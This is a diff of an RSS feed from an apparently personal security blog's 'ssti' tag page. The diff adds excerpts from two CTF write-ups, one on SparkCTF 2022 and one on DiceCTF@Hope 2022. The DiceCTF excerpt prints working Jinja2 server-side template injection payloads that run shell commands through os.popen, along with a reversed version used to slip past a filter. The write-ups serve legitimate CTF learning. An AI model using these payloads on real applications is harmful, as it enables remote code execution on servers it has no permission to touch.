@@ -2,9 +2,6 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>ssti on j3seer</title>
-    
-    
-    
     <link>https://j3seer.github.io/tags/ssti/</link>
     <description>Recent content in ssti on j3seer</description>
     <generator>Hugo -- gohugo.io</generator>
@@ -20,38 +17,22 @@
       <pubDate>Mon, 05 Dec 2022 00:00:00 +0000</pubDate>
       
       <guid>https://j3seer.github.io/posts/sparkctf-2022-writeup/</guid>
-      <description>
-        
-          
-          
-          
-        
-        
-        
-          Writeup for a challenge i wrote for SparkCTF 2022 held locally in Tunisia
-          
-        
-        </description>
+      <description>Description This challenge was about acheiving SSTI rce with an abstract way of getting the attributes and builtins. The idea was inspired from the GDG Algiers CTF 2022.
+I really loved the idea of using some abstract filter that can  &amp;ldquo;almost&amp;rdquo;  trully bypass any blacklist ( still need more research ) but the main thing is that we can now trully call any attribute using this trick and its rare that a blacklist would prevent you from using the map filter.</description>
     </item>
     
     <item>
       <title>DiceCTF@Hope 2022 - Writeup</title>
       <link>https://j3seer.github.io/posts/dicectfhope_writeup/</link>
-      <pubDate>Thu, 29 Sep 2022 00:00:00 +0000</pubDate>
+      <pubDate>Thu, 29 Sep 2022 08:59:19 -0400</pubDate>
       
       <guid>https://j3seer.github.io/posts/dicectfhope_writeup/</guid>
-      <description>
-        
-          
-          
-          
-        
-        
-        
-          Writeup for web challenges from diceCTF @Hope 2022
-          
-        
-        </description>
+      <description>Mostly solved the web challenges with Task_Hashed
+ Reverser the website is a text reverser and from the source code we can tell its an SSTI so we just have to put a regular SSTI payload but just reversed
+regular payload:
+{{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()}} {{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat flag-ccba9605-afeb-49a6-8aac-d56bac20705b.txt&#39;).read()}} supplied reversed payload:
+}} )(daer.)&#39;sl&#39;(nepop.]&#39;so&#39;[__slabolg__.__tini__.__ssalc__.gifnoc {{ }})(daer.)&#39;txt.b50702cab65d-caa8-6a94-befa-5069abcc-galf tac&#39;(nepop.]&#39;so&#39;[__slabolg__.__tini__.__ssalc__.gifnoc{{  Pastebin the important part of this challenge is :
+if (paste.search(/&amp;lt;.*&amp;gt;/) !== -1) { return res.redirect(&amp;#39;/flash?message=Illegal characters in paste!</description>
     </item>
     
   </channel>
